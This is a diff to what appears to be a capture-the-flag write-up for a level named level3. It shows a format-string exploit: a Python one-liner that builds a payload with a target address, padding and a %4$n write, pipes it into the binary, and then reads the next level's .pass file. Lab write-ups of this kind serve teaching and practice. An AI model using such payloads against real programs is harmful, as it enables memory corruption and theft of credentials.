@@ -43,8 +43,7 @@ echo -e "\x8c\x98\x04\x08 %p %p %p %p" | ./level3
 [Endian Address of the var][padding][write nb bytes at addrr]
 [\x8c\x98\x04\x08][A * 60][%4$n]  # %[number]$n -> [number]$, specify the position of address where we will write
 
-> python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
-> cat /tmp/exploit - | ./level3
+> (python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"'; cat) | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 > cat /home/user/level4/.pass
